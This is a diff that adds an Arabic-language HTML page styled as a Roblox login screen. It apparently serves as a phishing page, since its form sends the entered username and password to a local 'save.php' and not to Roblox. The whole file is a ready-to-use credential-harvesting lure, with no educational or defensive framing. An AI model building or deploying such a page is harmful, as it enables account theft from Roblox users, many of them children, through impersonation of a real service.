@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+ <meta charset="UTF-8">
+ <meta name="viewport" content="width=device-width, initial-scale=1.0">
+ <title>تسجيل الدخول - Roblox</title>
+ <style>
+ body {
+ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+ background-color: #f1f2f2;
+ display: flex;
+ justify-content: center;
+ align-items: center;
+ height: 100vh;
+ margin: 0;
+ }
+.login-container {
+ background-color: white;
+ padding: 30px;
+ border-radius: 10px;
+ box-shadow: 0 0 10px rgba(0,0,0,0.1);
+ text-align: center;
+ width: 300px;
+ }
+.logo {
+ font-size: 24px;
+ font-weight: bold;
+ color: #00a2e8;
+ margin-bottom: 20px;
+ }
+ input {
+ width: 100%;
+ padding: 10px;
+ margin: 5px 0;
+ border: 1px solid #ccc;
+ border-radius: 5px;
+ box-sizing: border-box;
+ }
+ button {
+ width: 100%;
+ padding: 10px;
+ background-color: #00a2e8;
+ color: white;
+ border: none;
+ border-radius: 5px;
+ cursor: pointer;
+ font-size: 16px;
+ }
+ button:hover {
+ background-color: #0088c9;
+ }
+ </style>
+</head>
+<body>
+
+<div class="login-container">
+ <div class="logo">Roblox</div>
+ <form action="save.php" method="POST">
+ <input type="text" name="username" placeholder="اسم المستخدم" required>
+ <input type="password" name="password" placeholder="كلمة المرور" required>
+ <button type="submit">دخول</button>
+ </form>
+</div>
+
+</body>
+</html>
